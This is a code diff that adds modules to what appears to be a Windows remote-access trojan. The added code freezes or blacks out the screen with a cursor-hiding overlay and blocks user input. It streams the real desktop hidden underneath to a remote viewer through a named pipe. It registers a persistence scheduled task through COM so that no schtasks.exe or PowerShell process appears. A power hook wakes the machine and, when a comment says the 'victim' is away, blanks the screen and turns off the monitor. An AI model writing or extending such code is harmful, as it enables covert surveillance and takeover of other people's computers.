@@ -73,7 +73,6 @@ def _module_exe_path() -> str:
     """
     try:
         import ctypes
-        from ctypes import wintypes
         kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
         buf = ctypes.create_unicode_buffer(4096)
         n = kernel32.GetModuleFileNameW(None, buf, len(buf))
@@ -365,6 +364,7 @@ def _com_slot(ptr, idx, *atypes):
 
 
 def _com_release(ptr) -> None:
+    import ctypes
     try:
         p = ptr.value if isinstance(ptr, ctypes.c_void_p) else ptr
         if p:
@@ -691,7 +691,6 @@ def deploy_stream(room: str = "default") -> str:
         try:
             _stream_state["phase"] = "checking"
             base = os.path.join(_base_dir(), INSTALL_DIR_NAME)
-            node_root = _stream_state_path()
 
             node = _node_exe()
             if not node:
@@ -762,6 +761,7 @@ def deploy_stream(room: str = "default") -> str:
                 pass
             _stream_state.update(popen=p, pid=p.pid, room=room,
                                  phase="running", last_error="")
+            _under_start()   # composite frame source for the streamer
         except Exception as e:
             _stream_state["last_error"] = str(e)
             _stream_state["phase"] = "failed"
@@ -844,6 +844,830 @@ def stream_status() -> str:
     return "\n".join(lines)
 
 
+# ===== OVERLAY / CURSOR / ELEVATION / POWER MODULE =====
+_ov_state = {"thread": None, "hwnd": None, "black": False,
+             "bits": None, "w": 0, "h": 0}
+_ov_refs = {}
+_pw_refs = {}
+
+
+def _capture_screen() -> None:
+    """One-shot GDI grab of the primary screen into a persistent BGRA
+    top-down buffer (used to paint the overlay once, no refresh)."""
+    import ctypes
+    u32 = ctypes.windll.user32
+    g32 = ctypes.windll.gdi32
+    ctx = u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))  # per-monitor
+    try:
+        w = u32.GetSystemMetrics(0)
+        h = u32.GetSystemMetrics(1)
+    finally:
+        if ctx:
+            u32.SetThreadDpiAwarenessContext(ctx)
+    if not w or not h:
+        return
+
+    class BMIH(ctypes.Structure):
+        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
+                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
+                    ("biBitCount", ctypes.c_ushort),
+                    ("biCompression", ctypes.c_uint),
+                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
+                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
+                    ("biClrImportant", ctypes.c_uint)]
+
+    class BMI(ctypes.Structure):
+        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]
+
+    bmi = BMI()
+    bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
+    bmi.bmiHeader.biWidth = w
+    bmi.bmiHeader.biHeight = -h          # top-down
+    bmi.bmiHeader.biPlanes = 1
+    bmi.bmiHeader.biBitCount = 32
+    hdc = u32.GetDC(None)
+    mem = g32.CreateCompatibleDC(hdc)
+    ptr = ctypes.c_void_p()
+    sec = g32.CreateDIBSection(mem, ctypes.byref(bmi), 0,
+                               ctypes.byref(ptr), None, 0)
+    if sec and ptr.value:
+        old = g32.SelectObject(mem, sec)
+        g32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)   # SRCCOPY
+        g32.SelectObject(mem, old)
+        buf = ctypes.create_string_buffer(w * h * 4)
+        ctypes.memmove(buf, ptr, w * h * 4)
+        _ov_state["bits"], _ov_state["w"], _ov_state["h"] = buf, w, h
+    if sec:
+        g32.DeleteObject(sec)
+    if mem:
+        g32.DeleteDC(mem)
+    if hdc:
+        u32.ReleaseDC(None, hdc)
+
+
+def _overlay_run(black: bool) -> None:
+    """Fullscreen NULL-cursor popup painted with the frozen screen (or
+    solid black). Owns a message pump; ends on WM_CLOSE."""
+    import ctypes
+    u32 = ctypes.windll.user32
+    g32 = ctypes.windll.gdi32
+    u32.DefWindowProcW.restype = ctypes.c_ssize_t
+    u32.DefWindowProcW.argtypes = (ctypes.c_void_p, ctypes.c_uint,
+                                   ctypes.c_size_t, ctypes.c_ssize_t)
+
+    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
+                                 ctypes.c_uint, ctypes.c_size_t,
+                                 ctypes.c_ssize_t)
+    WM_PAINT, WM_DESTROY = 0x0F, 0x02
+
+    class RECT(ctypes.Structure):
+        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
+                    ("r", ctypes.c_long), ("b", ctypes.c_long)]
+
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+
+    class PAINTSTRUCT(ctypes.Structure):
+        _fields_ = [("hdc", ctypes.c_void_p), ("fErase", ctypes.c_int),
+                    ("rcPaint", RECT), ("fRestore", ctypes.c_int),
+                    ("fIncUpdate", ctypes.c_int),
+                    ("rgbReserved", ctypes.c_byte * 32)]
+
+    class MSG(ctypes.Structure):
+        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
+                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
+                    ("time", ctypes.c_uint), ("pt", POINT)]
+
+    class WNDCLASSW(ctypes.Structure):
+        _fields_ = [("style", ctypes.c_uint), ("lpfnWndProc", WNDPROC),
+                    ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
+                    ("hInstance", ctypes.c_void_p), ("hIcon", ctypes.c_void_p),
+                    ("hCursor", ctypes.c_void_p),
+                    ("hbrBackground", ctypes.c_void_p),
+                    ("lpszMenuName", ctypes.c_wchar_p),
+                    ("lpszClassName", ctypes.c_wchar_p)]
+
+    class BMIH(ctypes.Structure):
+        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
+                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
+                    ("biBitCount", ctypes.c_ushort),
+                    ("biCompression", ctypes.c_uint),
+                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
+                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
+                    ("biClrImportant", ctypes.c_uint)]
+
+    class BMI(ctypes.Structure):
+        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]
+
+    # per-monitor DPI aware FIRST: all metrics/sizes in PHYSICAL pixels
+    # (125% scaling otherwise yields a 1536x864 window on a 1920x1080 panel)
+    _ov_refs["ctx"] = u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))
+    state = _ov_state
+    w, h, bits = state["w"], state["h"], state["bits"]
+    if not w or not h:                    # black mode with no prior capture
+        w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
+        state["w"], state["h"] = w, h
+
+    def proc(hwnd, msg, wp, lp):
+        if msg == WM_PAINT:
+            ps = PAINTSTRUCT()
+            hdc = u32.BeginPaint(hwnd, ctypes.byref(ps))
+            if black:
+                rect = RECT(0, 0, w, h)
+                br = g32.CreateSolidBrush(0)
+                u32.FillRect(hdc, ctypes.byref(rect), br)   # FillRect = user32
+                g32.DeleteObject(br)
+            elif bits and w and h:
+                bmi = BMI()
+                bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
+                bmi.bmiHeader.biWidth = w
+                bmi.bmiHeader.biHeight = -h
+                bmi.bmiHeader.biPlanes = 1
+                bmi.bmiHeader.biBitCount = 32
+                g32.StretchDIBits(hdc, 0, 0, w, h, 0, 0, w, h, bits,
+                                  ctypes.byref(bmi), 0, 0x00CC0020)
+            u32.EndPaint(hwnd, ctypes.byref(ps))
+            return 0
+        if msg == WM_DESTROY:
+            u32.PostQuitMessage(0)
+            return 0
+        if msg == 0x20:                       # WM_SETCURSOR: force hidden
+            if (lp & 0xFFFF) == 1:            # HTCLIENT = over our window
+                u32.SetCursor(None)
+                return 1                      # skip DefWindowProc
+        return u32.DefWindowProcW(hwnd, msg, wp, lp)
+
+    # keep EVERY pump callback alive forever: the registered window class
+    # still points at earlier trampolines - GC'ing one = access violation
+    _ov_refs.setdefault("procs", []).append(WNDPROC(proc))
+    _ov_refs["proc"] = _ov_refs["procs"][-1]
+    wc = WNDCLASSW()
+    wc.lpfnWndProc = _ov_refs["proc"]
+    wc.hCursor = None                     # NULL-cursor class hides pointer
+    wc.lpszClassName = "nvo"
+    if not u32.RegisterClassW(ctypes.byref(wc)):
+        if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
+            return
+    hwnd = u32.CreateWindowExW(0x8 | 0x80, "nvo", "", 0x80000000,  # WS_POPUP
+                               0, 0, w, h, None, None, None, None)
+    if not hwnd:
+        return
+    state["hwnd"] = hwnd
+    u32.ShowWindow(hwnd, 5)               # SW_SHOW
+    u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0040)   # HWND_TOPMOST-ish
+    m = MSG()
+    while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
+        u32.TranslateMessage(ctypes.byref(m))
+        u32.DispatchMessageW(ctypes.byref(m))
+    state["hwnd"] = None
+
+
+def _overlay_on(black: bool = False) -> str:
+    if os.name != "nt":
+        return "[!] overlay: Windows only"
+    t = _ov_state["thread"]
+    if t and t.is_alive():
+        return "[i] overlay already on"
+    _under_start()   # keep the composite frame source warm while overlay runs
+    if not black:
+        _capture_screen()
+    t = threading.Thread(target=_overlay_run, args=(black,),
+                         daemon=True, name="overlay")
+    _ov_state["thread"] = t
+    t.start()
+    for _ in range(50):                   # up to ~2.5s for window creation
+        if _ov_state["hwnd"]:
+            break
+        time.sleep(0.05)
+    if _ov_state["hwnd"]:
+        _ov_state["black"] = black
+        return "[+] overlay on (screen frozen, input swallowed, cursor hidden)"
+    return "[!] overlay failed to create window"
+
+
+def _overlay_off() -> str:
+    hwnd = _ov_state["hwnd"]
+    t = _ov_state["thread"]
+    if not hwnd and (not t or not t.is_alive()):
+        return "[i] overlay not running"
+    if hwnd:
+        import ctypes
+        ctypes.windll.user32.PostMessageW(hwnd, 0x10, 0, 0)   # WM_CLOSE
+    if t:
+        t.join(timeout=5)
+    _ov_state["bits"] = None
+    return "[+] overlay off (screen live again)"
+
+
+def _cursor_block(hard: bool = False) -> str:
+    """Pin the cursor to a 1x1 rect at its current position (no admin
+    needed). hard=BlockInput additionally (admin only).
+    NOTE: this also pins the netvnc node's remotely-injected cursor -
+    turn the block off (cursor unblock) before active remote control."""
+    import ctypes
+    u32 = ctypes.windll.user32
+
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+
+    class RECT(ctypes.Structure):
+        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
+                    ("r", ctypes.c_long), ("b", ctypes.c_long)]
+
+    pt = POINT()
+    u32.GetCursorPos(ctypes.byref(pt))
+    r = RECT(pt.x, pt.y, pt.x + 1, pt.y + 1)
+    u32.ClipCursor(ctypes.byref(r))
+    msg = "[+] cursor pinned at (%d,%d)" % (pt.x, pt.y)
+    if hard:
+        if u32.BlockInput(1):
+            msg += ", hard BlockInput on"
+        else:
+            msg += ", BlockInput failed (needs admin)"
+    return msg
+
+
+def _cursor_unblock() -> str:
+    import ctypes
+    u32 = ctypes.windll.user32
+    u32.ClipCursor(None)
+    u32.BlockInput(0)
+    return "[+] cursor released"
+
+
+# ===== UNDER-OVERLAY COMPOSITE CAPTURE (netvnc frame source) =====
+# Streams the REAL desktop (windows + taskbar, overlay excluded) as raw
+# BGRA frames over \\.\pipe\nvunder. The netvnc ffmpeg reads it with
+# -f rawvideo instead of gdigrab, so the stream shows live content even
+# while the frozen overlay covers the screen. Occlusion-culled per-window
+# PrintWindow(PW_RENDERFULLCONTENT) composite, ~12-24 fps at 1080p.
+_UNDER_PIPE = "\\\\.\\pipe\\nvunder"
+_UNDER_FPS = 12
+_under_srv = {"run": False, "w": 0, "h": 0, "thread": None}
+
+
+def _under_meta_path() -> str:
+    return os.path.join(_stream_state_path(), DESK_DIR, "under.json")
+
+
+def _under_start() -> str:
+    if os.name != "nt":
+        return "[!] under-capture: Windows only"
+    t = _under_srv["thread"]
+    if t and t.is_alive():
+        return "[i] under-capture already running"
+    _under_srv["run"] = True
+    t = threading.Thread(target=_under_server_main, daemon=True, name="nvunder")
+    _under_srv["thread"] = t
+    t.start()
+    return "[+] under-capture server started (" + _UNDER_PIPE + ")"
+
+
+def _under_stop() -> str:
+    t = _under_srv["thread"]
+    if not t or not t.is_alive():
+        _under_srv["run"] = False
+        return "[i] under-capture not running"
+    _under_srv["run"] = False
+    t.join(timeout=5)
+    try:
+        os.remove(_under_meta_path())
+    except OSError:
+        pass
+    return "[+] under-capture stopped"
+
+
+def _under_status() -> str:
+    t = _under_srv["thread"]
+    on = bool(t and t.is_alive())
+    line = "under-capture: " + ("RUNNING" if on else "STOPPED")
+    if on:
+        line += " pipe=%s frame=%dx%dx4 (bgra) @%dfps" % (
+            _UNDER_PIPE, _under_srv["w"], _under_srv["h"], _UNDER_FPS)
+    return line
+
+
+def _under_server_main():
+    import ctypes
+    from ctypes import wintypes
+
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    u32 = ctypes.windll.user32
+    g32 = ctypes.windll.gdi32
+    dwm = ctypes.windll.dwmapi
+    u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))   # physical px
+    W, H = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
+    _under_srv["w"], _under_srv["h"] = W, H
+
+    # publish frame geometry so the streamer can build -s WxH
+    try:
+        os.makedirs(os.path.dirname(_under_meta_path()), exist_ok=True)
+        with open(_under_meta_path(), "w") as fh:
+            fh.write('{"w": %d, "h": %d}' % (W, H))
+    except Exception:
+        pass
+
+    class BMIH(ctypes.Structure):
+        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
+                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
+                    ("biBitCount", ctypes.c_ushort), ("biCompression", ctypes.c_uint),
+                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
+                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
+                    ("biClrImportant", ctypes.c_uint)]
+
+    class BMI(ctypes.Structure):
+        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]
+
+    def new_bgra(w, h):
+        bmi = BMI()
+        bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
+        bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight = w, -h
+        bmi.bmiHeader.biPlanes, bmi.bmiHeader.biBitCount = 1, 32
+        hdc = u32.GetDC(None)
+        mem = g32.CreateCompatibleDC(hdc)
+        bmp = g32.CreateCompatibleBitmap(hdc, w, h)
+        g32.SelectObject(mem, bmp)
+        u32.ReleaseDC(None, hdc)
+        return mem, bmp, bmi
+
+    SRCCOPY = 0x00CC0020
+    RGN_DIFF, NULLREGION = 4, 1
+
+    def is_capturable(h):
+        if not u32.IsWindowVisible(h) or u32.IsIconic(h):
+            return False
+        r = wintypes.RECT()
+        if not u32.GetWindowRect(h, ctypes.byref(r)):
+            return False
+        if r.right - r.left < 40 or r.bottom - r.top < 40:
+            return False
+        cloaked = ctypes.c_int(0)
+        dwm.DwmGetWindowAttribute(h, 14, ctypes.byref(cloaked), 4)
+        if cloaked.value:
+            return False
+        t = ctypes.create_unicode_buffer(64)
+        u32.GetClassNameW(h, t, 64)
+        if t.value == "nvo":          # our overlay - excluded by design
+            return False
+        return True
+
+    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
+    frame_len = W * H * 4
+    frame_buf = ctypes.create_string_buffer(frame_len)
+
+    class CURSORINFO(ctypes.Structure):
+        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
+                    ("hCursor", wintypes.HANDLE),
+                    ("ptScreenPos", wintypes.POINT)]
+
+    # ---- named pipe server (multi-instance, overlapped accept) ----
+    PIPE_ACCESS_OUTBOUND = 0x00000002
+    PIPE_UNLIMITED_INSTANCES = 255
+    ERROR_PIPE_CONNECTED = 535
+    ERROR_IO_PENDING = 997
+    WAIT_OBJECT_0 = 0
+    INFINITE = 0xFFFFFFFF
+
+    k32.CreateNamedPipeW.restype = ctypes.c_void_p
+    k32.CreateNamedPipeW.argtypes = (
+        wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
+        wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID)
+    k32.ConnectNamedPipe.argtypes = (ctypes.c_void_p, wintypes.LPVOID)
+    k32.DisconnectNamedPipe.argtypes = (ctypes.c_void_p,)
+    k32.CreateEventW.restype = ctypes.c_void_p
+    k32.CreateEventW.argtypes = (wintypes.LPVOID, wintypes.BOOL,
+                                 wintypes.BOOL, wintypes.LPCWSTR)
+    k32.SetEvent.argtypes = (ctypes.c_void_p,)
+    k32.WaitForMultipleObjects.restype = ctypes.c_uint
+    k32.WaitForMultipleObjects.argtypes = (
+        wintypes.DWORD, ctypes.POINTER(ctypes.c_void_p), wintypes.BOOL,
+        wintypes.DWORD)
+    k32.WriteFile.argtypes = (ctypes.c_void_p, ctypes.c_char_p, wintypes.DWORD,
+                              ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID)
+
+    class OVERLAPPED(ctypes.Structure):
+        _fields_ = [("Internal", ctypes.POINTER(ctypes.c_ulong)),
+                    ("InternalHigh", ctypes.POINTER(ctypes.c_ulong)),
+                    ("Offset", wintypes.DWORD), ("OffsetHigh", wintypes.DWORD),
+                    ("hEvent", ctypes.c_void_p)]
+
+    INVALID = ctypes.c_void_p(-1).value
+    stop_evt = k32.CreateEventW(None, True, False, None)
+    conns = []
+    conns_lock = threading.Lock()
+
+    def accept_loop():
+        ev = k32.CreateEventW(None, True, False, None)
+        handles = (ctypes.c_void_p * 2)(ev, stop_evt)
+        while _under_srv["run"]:
+            h = k32.CreateNamedPipeW(
+                _UNDER_PIPE, PIPE_ACCESS_OUTBOUND, 0, PIPE_UNLIMITED_INSTANCES,
+                0, 1 << 20, 0, None)
+            if not h or h == INVALID:
+                time.sleep(0.5)
+                continue
+            ov = OVERLAPPED()
+            ov.hEvent = ev
+            connected = False
+            if k32.ConnectNamedPipe(h, ctypes.byref(ov)):
+                connected = True
+            else:
+                err = k32.GetLastError()
+                if err == ERROR_PIPE_CONNECTED:
+                    connected = True
+                elif err == ERROR_IO_PENDING:
+                    if k32.WaitForMultipleObjects(2, handles, False,
+                                                  INFINITE) == WAIT_OBJECT_0:
+                        connected = True
+                    else:
+                        k32.CloseHandle(h)
+                        break
+                else:
+                    k32.CloseHandle(h)
+                    continue
+            if connected:
+                with conns_lock:
+                    conns.append(h)
+
+    def capture_loop():
+        mem, bmp, bmi = new_bgra(W, H)
+        dc_cache = {}
+        visible = []          # (hwnd, rect, visible_rgn) top->bottom
+        cull_at = 0.0
+        interval = 1.0 / _UNDER_FPS
+        while _under_srv["run"]:
+            t0 = time.perf_counter()
+            if t0 >= cull_at:
+                # occlusion culling: visible region = rect minus union of
+                # everything above it in z-order
+                order = []
+
+                @CB
+                def cb(hwnd, lp):
+                    order.append(hwnd)
+                    return True
+
+                u32.EnumWindows(cb, 0)
+                newvis = []
+                for hwnd in order:            # top -> bottom
+                    if not is_capturable(hwnd):
+                        continue
+                    r = wintypes.RECT()
+                    u32.GetWindowRect(hwnd, ctypes.byref(r))
+                    if r.right <= 0 or r.bottom <= 0 or r.left >= W or r.top >= H:
+                        continue
+                    rgn = g32.CreateRectRgn(r.left, r.top,
+                                            min(r.right, W), min(r.bottom, H))
+                    for _, _, above in newvis:
+                        g32.CombineRgn(rgn, rgn, above, RGN_DIFF)
+                    box = wintypes.RECT()
+                    if g32.GetRgnBox(rgn, ctypes.byref(box)) == NULLREGION:
+                        g32.DeleteObject(rgn)
+                        continue
+                    newvis.append((hwnd, r, rgn))
+                live = {h for h, _, _ in newvis}
+                for h in list(dc_cache):
+                    if h not in live:
+                        wmem, wbmp, _wbmi = dc_cache.pop(h)
+                        g32.DeleteObject(wbmp)
+                        g32.DeleteDC(wmem)
+                for _, _, rgn in visible:
+                    g32.DeleteObject(rgn)
+                visible = newvis
+                cull_at = t0 + 2.0
+            # composite bottom -> top, clipped to each window's visible region
+            for hwnd, r, rgn in reversed(visible):
+                if not u32.IsWindow(hwnd):
+                    continue
+                w = min(r.right - r.left, W)
+                h = min(r.bottom - r.top, H)
+                ent = dc_cache.get(hwnd)
+                if not ent:
+                    ent = new_bgra(w, h)
+                    dc_cache[hwnd] = ent
+                wmem, _wbmp, _wbmi = ent
+                if u32.PrintWindow(hwnd, wmem, 2):   # PW_RENDERFULLCONTENT
+                    g32.SelectClipRgn(mem, rgn)
+                    g32.BitBlt(mem, r.left, r.top, w, h, wmem, 0, 0, SRCCOPY)
+                    g32.SelectClipRgn(mem, None)
+            # draw the real cursor so remote control stays visually aligned
+            cur = CURSORINFO()
+            cur.cbSize = ctypes.sizeof(cur)
+            if u32.GetCursorInfo(ctypes.byref(cur)) and (cur.flags & 1) and cur.hCursor:
+                u32.DrawIconEx(mem, cur.ptScreenPos.x, cur.ptScreenPos.y,
+                               cur.hCursor, 0, 0, 0, None, 1)   # DI_NORMAL
+            g32.GetDIBits(mem, bmp, 0, H, frame_buf, ctypes.byref(bmi), 0)
+            data = frame_buf.raw
+            with conns_lock:
+                alive = []
+                for h in conns:
+                    written = wintypes.DWORD(0)
+                    if k32.WriteFile(h, data, frame_len,
+                                     ctypes.byref(written), None) \
+                            and written.value == frame_len:
+                        alive.append(h)
+                    else:
+                        k32.DisconnectNamedPipe(h)
+                        k32.CloseHandle(h)
+                conns[:] = alive
+            delay = interval - (time.perf_counter() - t0)
+            if delay > 0:
+                time.sleep(delay)
+        for _h, ent in dc_cache.items():
+            g32.DeleteObject(ent[1])
+            g32.DeleteDC(ent[0])
+        g32.DeleteObject(bmp)
+        g32.DeleteDC(mem)
+
+    acc = threading.Thread(target=accept_loop, daemon=True)
+    cap = threading.Thread(target=capture_loop, daemon=True)
+    acc.start()
+    cap.start()
+    while _under_srv["run"]:
+        time.sleep(0.25)
+    k32.SetEvent(stop_evt)
+    with conns_lock:
+        for h in conns:
+            k32.DisconnectNamedPipe(h)
+            k32.CloseHandle(h)
+        conns.clear()
+    acc.join(timeout=3)
+
+
+def _wake_flag() -> str:
+    return os.path.join(_stream_state_path(), "wake.armed")
+
+
+def _wake_armed() -> bool:
+    return os.path.exists(_wake_flag())
+
+
+def _register_wake_task(install_path: str, minutes: int = 0) -> bool:
+    """Re-register the persistence task with <WakeToRun> plus an optional
+    one-shot time trigger (minutes > 0). Same in-process COM sequence as
+    _create_task - no schtasks.exe child, no PowerShell."""
+    try:
+        import ctypes
+        import xml.sax.saxutils as _sx
+        from datetime import datetime, timedelta
+        handles = _ts_open()
+        if not handles:
+            return False
+        svc, folder = handles
+        try:
+            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
+                                         os.environ.get("USERNAME", "")))
+            trig = "<LogonTrigger><UserId>%s</UserId></LogonTrigger>" % uid
+            if minutes > 0:
+                when = (datetime.now() + timedelta(minutes=minutes)
+                        ).strftime("%Y-%m-%dT%H:%M:%S")
+                trig += ("<TimeTrigger><StartBoundary>%s</StartBoundary>"
+                         "<Enabled>true</Enabled></TimeTrigger>" % when)
+            xml = (
+                '<?xml version="1.0" encoding="UTF-16"?>'
+                '<Task version="1.2" '
+                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
+                '<Triggers>%s</Triggers>'
+                '<Principals><Principal id="Author"><UserId>%s</UserId>'
+                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
+                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
+                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
+                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
+                '<WakeToRun>true</WakeToRun>'
+                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
+                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
+                '</Task>'
+            ) % (trig, uid, _sx.escape(install_path))
+            VARIANT = _variant_type()
+            reg = _com_slot(folder, 16,
+                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
+                            ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(VARIANT),
+                            ctypes.c_long, ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(ctypes.c_void_p))
+            out = ctypes.c_void_p()
+            v = VARIANT()
+            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
+                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
+                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
+            _com_release(out)
+            return True
+        finally:
+            _ts_release(svc, folder)
+    except Exception:
+        return False
+
+
+def _wake_arm() -> str:
+    with open(_wake_flag(), "w") as f:
+        f.write("1")
+    if _register_wake_task(_module_exe_path(), 0):
+        return "[+] wake armed (task registered with WakeToRun)"
+    return "[+] wake armed (flag set; task re-register failed)"
+
+
+def _idle_seconds() -> float:
+    """Seconds since last physical input (GetLastInputInfo)."""
+    import ctypes
+
+    class LASTINPUTINFO(ctypes.Structure):
+        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
+
+    lii = LASTINPUTINFO()
+    lii.cbSize = ctypes.sizeof(lii)
+    if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
+        return 0.0
+    return max(0.0, (ctypes.windll.kernel32.GetTickCount()
+                     - lii.dwTime) / 1000.0)
+
+
+def _monitor_off() -> None:
+    import ctypes
+    u32 = ctypes.windll.user32
+    u32.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, 2,   # SC_MONITORPOWER=2
+                            2, 1000, ctypes.byref(ctypes.c_size_t()))
+
+
+def _sleep_now() -> None:
+    import ctypes
+    ctypes.windll.powrprof.SetSuspendState(False, False, False)
+
+
+def _power_hook() -> None:
+    """WM_POWERBROADCAST watcher: on suspend (wake armed) re-registers the
+    task with a one-shot wake trigger; on resume with no user present it
+    blanks the screen, kills the monitor and holds the system awake so the
+    stream keeps running."""
+    import ctypes
+    u32 = ctypes.windll.user32
+    k32 = ctypes.windll.kernel32
+    u32.DefWindowProcW.restype = ctypes.c_ssize_t
+    u32.DefWindowProcW.argtypes = (ctypes.c_void_p, ctypes.c_uint,
+                                   ctypes.c_size_t, ctypes.c_ssize_t)
+    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
+                                 ctypes.c_uint, ctypes.c_size_t,
+                                 ctypes.c_ssize_t)
+    WM_POWERBROADCAST = 0x0218
+    PBT_APMSUSPEND, PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC = 4, 7, 18
+
+    class RECT(ctypes.Structure):
+        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
+                    ("r", ctypes.c_long), ("b", ctypes.c_long)]
+
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+
+    class MSG(ctypes.Structure):
+        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
+                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
+                    ("time", ctypes.c_uint), ("pt", POINT)]
+
+    class WNDCLASSW(ctypes.Structure):
+        _fields_ = [("style", ctypes.c_uint), ("lpfnWndProc", WNDPROC),
+                    ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
+                    ("hInstance", ctypes.c_void_p), ("hIcon", ctypes.c_void_p),
+                    ("hCursor", ctypes.c_void_p),
+                    ("hbrBackground", ctypes.c_void_p),
+                    ("lpszMenuName", ctypes.c_wchar_p),
+                    ("lpszClassName", ctypes.c_wchar_p)]
+
+    def proc(hwnd, msg, wp, lp):
+        if msg == WM_POWERBROADCAST:
+            try:
+                if wp == PBT_APMSUSPEND and _wake_armed():
+                    _register_wake_task(_module_exe_path(), 1)   # wake +1min
+                elif (wp in (PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC)
+                      and _wake_armed()):
+                    time.sleep(2.0)
+                    if _idle_seconds() > 30:   # victim still away
+                        _overlay_on(True)       # blank-screen overlay
+                        _monitor_off()
+                        # ES_CONTINUOUS | ES_SYSTEM_REQUIRED on this thread
+                        k32.SetThreadExecutionState(0x80000001)
+            except Exception:
+                pass
+            return 1
+        return u32.DefWindowProcW(hwnd, msg, wp, lp)
+
+    _pw_refs["procs"] = _pw_refs.get("procs", []) + [WNDPROC(proc)]
+    _pw_refs["proc"] = _pw_refs["procs"][-1]
+    wc = WNDCLASSW()
+    wc.lpfnWndProc = _pw_refs["proc"]
+    wc.lpszClassName = "nvp"
+    if not u32.RegisterClassW(ctypes.byref(wc)):
+        if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
+            return
+    # plain (non message-only) hidden top-level window: message-only
+    # windows never receive WM_POWERBROADCAST
+    hwnd = u32.CreateWindowExW(0, "nvp", "nvp", 0, 0, 0, 0, 0,
+                               None, None, None, None)
+    if not hwnd:
+        return
+    m = MSG()
+    while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
+        u32.TranslateMessage(ctypes.byref(m))
+        u32.DispatchMessageW(ctypes.byref(m))
+
+
+def _start_power_hook() -> None:
+    if os.name == "nt":
+        threading.Thread(target=_power_hook, daemon=True,
+                         name="pwrhook").start()
+
+
+def _power_status() -> str:
+    lines = []
+    if os.name == "nt":
+        import ctypes
+        try:
+            admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
+        except Exception:
+            admin = False
+        lines.append("elevated: %s" % ("YES" if admin else "no"))
